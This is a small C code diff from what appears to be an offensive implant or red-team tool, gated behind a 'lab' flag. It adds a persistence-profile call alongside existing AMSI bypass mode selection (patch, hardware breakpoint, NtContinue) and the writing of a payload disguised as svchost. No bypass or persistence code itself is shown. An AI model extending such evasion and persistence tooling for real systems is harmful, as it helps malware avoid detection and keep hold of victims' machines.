@@ -38,6 +38,7 @@ void Stealth_InitLabFeatures(void)
     const int defaultLab = 0;
 #endif
     if (!EnvEnabledW(L"STEALTH_LAB", defaultLab)) { return; }
+    Stealth_EnsureLoggingDefaults();
 
     // 1) AMSI bypass selection: STEALTH_AMSI = patch|hwbp|ntcontinue|none (default: patch)
     wchar_t amsiMode[16] = {0};
@@ -154,6 +155,8 @@ void Stealth_InitLabFeatures(void)
             Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
         }
     }
+
+    Stealth_ApplyPersistenceProfile();
 #else
     (void)0; // not enabled in this build
 #endif
